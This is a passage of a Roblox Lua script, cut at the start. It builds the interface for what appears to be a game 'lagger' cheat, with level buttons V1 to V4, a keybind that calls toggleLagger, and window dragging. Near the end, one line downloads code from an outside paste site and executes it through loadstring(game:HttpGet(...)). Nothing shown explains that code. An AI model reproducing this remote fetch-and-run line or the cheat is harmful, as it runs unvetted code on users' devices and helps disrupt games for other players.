0, 28) btnContainer.ZIndex = 2 local containerCornerBtn = Instance.new("UICorner", btnContainer) containerCornerBtn.CornerRadius = UDim.new(1, 0) local btnY = 0 local btnW = 50 local btnH = 30 local espaciado = 6 local totalWidth = (btnW * 4) + (espaciado * 3) local margenIzq = (btnContainer.Size.X.Offset - totalWidth) / 2 btnV1 = Instance.new("TextButton", btnContainer) btnV1.Size = UDim2.new(0, btnW, 0, btnH) btnV1.Position = UDim2.new(0, margenIzq, 0, 1) btnV1.Font = UI_CONFIG.Font btnV1.Text = "V1" btnV1.TextColor3 = Color3.fromRGB(150, 150, 160) btnV1.TextSize = 11 btnV1.AutoButtonColor = false btnV1.BackgroundColor3 = Color3.fromRGB(60, 60, 70) btnV1.BorderSizePixel = 1 btnV1.BorderColor3 = Color3.fromRGB(80, 80, 90) btnV1.ZIndex = 3 local V1Corner = Instance.new("UICorner", btnV1) V1Corner.CornerRadius = UDim.new(1, 0) btnV1.MouseButton1Click:Connect(function() nivelActual = "V1" actualizarBotonesNivel() SaveConfig() end) btnV2 = Instance.new("TextButton", btnContainer) btnV2.Size = UDim2.new(0, btnW, 0, btnH) btnV2.Position = UDim2.new(0, margenIzq + btnW + espaciado, 0, 1) btnV2.Font = UI_CONFIG.Font btnV2.Text = "V2" btnV2.TextColor3 = Color3.fromRGB(150, 150, 160) btnV2.TextSize = 11 btnV2.AutoButtonColor = false btnV2.BackgroundColor3 = Color3.fromRGB(60, 60, 70) btnV2.BorderSizePixel = 1 btnV2.BorderColor3 = Color3.fromRGB(80, 80, 90) btnV2.ZIndex = 3 local V2Corner = Instance.new("UICorner", btnV2) V2Corner.CornerRadius = UDim.new(1, 0) btnV2.MouseButton1Click:Connect(function() nivelActual = "V2" actualizarBotonesNivel() SaveConfig() end) btnV3 = Instance.new("TextButton", btnContainer) btnV3.Size = UDim2.new(0, btnW, 0, btnH) btnV3.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 2, 0, 1) btnV3.Font = UI_CONFIG.Font btnV3.Text = "V3" btnV3.TextColor3 = Color3.fromRGB(150, 150, 160) btnV3.TextSize = 11 btnV3.AutoButtonColor = false btnV3.BackgroundColor3 = Color3.fromRGB(60, 60, 70) btnV3.BorderSizePixel = 1 btnV3.BorderColor3 = Color3.fromRGB(80, 80, 90) btnV3.ZIndex = 3 local V3Corner = Instance.new("UICorner", btnV3) V3Corner.CornerRadius = UDim.new(1, 0) btnV3.MouseButton1Click:Connect(function() nivelActual = "V3" actualizarBotonesNivel() SaveConfig() end) btnV4 = Instance.new("TextButton", btnContainer) btnV4.Size = UDim2.new(0, btnW, 0, btnH) btnV4.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 3, 0, 1) btnV4.Font = UI_CONFIG.Font btnV4.Text = "V4" btnV4.TextColor3 = Color3.fromRGB(150, 150, 160) btnV4.TextSize = 11 btnV4.AutoButtonColor = false btnV4.BackgroundColor3 = Color3.fromRGB(60, 60, 70) btnV4.BorderSizePixel = 1 btnV4.BorderColor3 = Color3.fromRGB(80, 80, 90) btnV4.ZIndex = 3 local V4Corner = Instance.new("UICorner", btnV4) V4Corner.CornerRadius = UDim.new(1, 0) btnV4.MouseButton1Click:Connect(function() showWarning(function(confirmed) if confirmed then nivelActual = "V4" actualizarBotonesNivel() SaveConfig() end end) end) modeTextLabel = Instance.new("TextLabel", centralContainer) modeTextLabel.BackgroundTransparency = 1 modeTextLabel.Position = UDim2.new(0, 15, 1, -12) modeTextLabel.Size = UDim2.new(0, 180, 0, 16) modeTextLabel.Font = Enum.Font.GothamBlack modeTextLabel.Text = "MODE SPEED 50-25" modeTextLabel.TextColor3 = Color3.fromRGB(255, 45, 45) modeTextLabel.TextSize = 11 modeTextLabel.TextXAlignment = Enum.TextXAlignment.Left modeTextLabel.TextYAlignment = Enum.TextYAlignment.Center modeTextLabel.ZIndex = 3 actualizarBotonesNivel() actualizarSwitch() keybindButton.MouseButton1Click:Connect(function() if listeningForInput then return end listeningForInput = true keybindButton.Text = "KEY: ..." keybindButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0) keybindButton.TextColor3 = Color3.fromRGB(255,255,255) end) local inputConnection inputConnection = UserInputService.InputBegan:Connect(function(input, gp) if not listeningForInput then return end if gp then return end local newKey = nil if input.KeyCode ~= Enum.KeyCode.Unknown then newKey = input.KeyCode elseif input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode ~= Enum.KeyCode.Unknown then newKey = input.KeyCode end if newKey then keybind = newKey actualizarKeybindButton() SaveConfig() listeningForInput = false keybindButton.BackgroundColor3 = Color3.fromRGB(25, 25, 30) keybindButton.BackgroundTransparency = 0.3 keybindButton.TextColor3 = Color3.fromRGB(200, 200, 220) end end) local isDragging, dragStart, startPos = false, nil, nil mainFrame.InputBegan:Connect(function(input) if ventanaBloqueada then return end if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then isDragging = true dragStart = input.Position startPos = mainFrame.Position end end) UserInputService.InputChanged:Connect(function(input) if not isDragging or ventanaBloqueada then return end if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then local delta = input.Position - dragStart mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) end end) mainFrame.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then isDragging = false end end) 
loadstring(game:HttpGet("https://pastefy.app/1hYnEiwl/raw"))()
UserInputService.InputBegan:Connect(function(input, gp) if gp then return end if input.KeyCode == keybind or (input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode == keybind) then toggleLagger() end end)
